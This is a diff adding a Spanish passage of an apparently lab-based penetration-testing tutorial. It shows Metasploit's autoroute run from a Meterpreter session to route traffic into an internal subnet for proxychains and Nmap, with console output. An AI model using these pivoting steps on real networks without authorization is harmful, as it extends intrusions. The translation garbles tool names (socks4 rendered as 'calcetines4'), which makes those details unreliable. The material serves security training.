@@ -85,3 +85,65 @@ socks4 	127.0.0.1 9050
 ```
 
 Nota: Dependiendo de la versión que esté ejecutando el servidor SOCKS, es posible que ocasionalmente necesitemos cambiar calcetines4 a calcetines5 en proxychains.conf.
+
+Finalmente, necesitamos decirle a nuestro módulo calcetines_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el `post/multi/manage/autoroute` Módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo el tráfico de nuestras cadenas de proxy.
+
+#### Crear rutas con AutoRoute
+
+Túneles y reenvío de puertos de Meterpreter
+
+```python
+msf6 > use post/multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 10.129.202.64
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+[*] Post module execution completed
+```
+
+También es posible agregar rutas con autorruta ejecutando autoroute desde la sesión de Meterpreter.
+
+Túneles y reenvío de puertos de Meterpreter
+
+```python
+meterpreter > run autoroute -s 172.16.5.0/23
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.16.5.0/255.255.254.0...
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+[*] Use the -p option to list all active routes
+```
+
+Después de agregar las rutas necesarias, podemos usar el `-p` opción para enumerar las rutas activas para asegurarnos de que nuestra configuración se aplique como se esperaba.
+
+#### Listado de rutas activas con AutoRoute
+
+Túneles y reenvío de puertos de Meterpreter
+
+```python
+meterpreter > run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
+```
+
+Como puede ver en el resultado anterior, la ruta se agregó a la red 172.16.5.0/23. Ahora podremos usar cadenas proxy para enrutar nuestro tráfico de Nmap a través de nuestra sesión de Meterpreter.
